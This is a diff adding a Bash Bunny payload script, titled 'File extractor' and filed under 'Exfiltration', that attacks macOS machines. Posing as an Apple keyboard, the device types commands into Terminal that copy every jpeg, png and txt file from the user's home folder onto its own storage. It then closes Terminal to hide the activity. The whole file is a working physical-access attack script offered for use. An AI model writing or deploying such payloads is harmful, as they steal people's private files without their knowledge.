@@ -1,0 +1,45 @@
+#!/bin/bash
+#
+# Title:         File extractor
+# Author:        Marcio Castillo
+# Version:       1.0
+# Category:      Exfiltration
+# Target:        macOS
+# Attackmodes:   HID, Storage
+# Props:         k1ul3ss, audibleblink (oringal version)
+# Summary:       I modified the code to extract multiple files types (jpeg, png, txt) 
+#                from the target computer and save it on the bash bunny.
+
+ATTACKMODE STORAGE HID VID_0X05AC PID_0X021E
+
+LED STAGE2
+
+#ATTACKMODE STORAGE HID VID_0X05AC PID_0X021E
+
+# device name
+dev_name="BashBunny"
+
+# loot directory
+lootdir="/Volumes/$dev_name/loot/macfilesaver/"
+
+# host location
+hostdir="~/"
+
+# accept multiple file types
+filetypes="\( -name '*.jpeg' -o -name '*.png' -o -name '*.txt' \)"
+
+QUACK GUI SPACE
+QUACK DELAY 1000
+QUACK STRING terminal
+QUACK ENTER
+QUACK DELAY 3000
+QUACK STRING mkdir -p $lootdir
+QUACK ENTER
+QUACK STRING find $hostdir -type f $filetypes -exec cp \"{}\" $lootdir \\\;\; killall Terminal
+QUACK ENTER
+
+# sync the filesystem
+sync
+
+$ set led to solid green
+LED G
